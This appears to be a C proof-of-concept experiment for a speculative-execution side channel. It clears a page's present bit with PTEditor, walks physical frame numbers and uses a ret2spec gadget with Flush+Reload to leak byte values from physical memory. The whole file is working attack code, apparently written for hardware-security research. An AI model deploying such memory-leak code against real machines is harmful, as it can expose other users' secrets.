#include "constants.h"
#include "flush_and_reload.h"
#include "ret2spec.h"

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>
#include <stdint.h>

int main() {
  // Step 1: Create a variable
  // Step 2: modify PTE to change make page containing that variable non-present
  //         optionally modify the PTE physical page
  // Step 3: FLUSH reload buffer
  // Step 4: Speculatively access variable
  // Step 5: RELOAD reload buffer

  void *secret = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

  assert(!ptedit_init());
  ptedit_pte_clear_bit(secret, 0, PTEDIT_PAGE_PRESENT);

  void *reload_buffer = mmap(NULL, 256 * PAGE_SIZE, PROT_WRITE | PROT_READ,
                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  size_t threshold = 150;

  for (int pfn = 0; pfn < 0x10000; ++pfn) {
    size_t results[VALUES_IN_BYTE] = {0};
    ptedit_pte_set_pfn(secret, 0, pfn);

    for (int i = 0; i < 100; ++i) {
      flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
      ret2spec(secret, reload_buffer);
      reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
    }

    for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
      // if (i == 0x1 || i == 0x2 || i == 0x3 || i == 0x4) {
      if (results[i] > 0) {
        printf("Results PFN %x:\t", pfn);
        printf("0x%lx\t%ld\n", i, results[i]);
      }
      // }
    }
  }

  ptedit_cleanup();
}
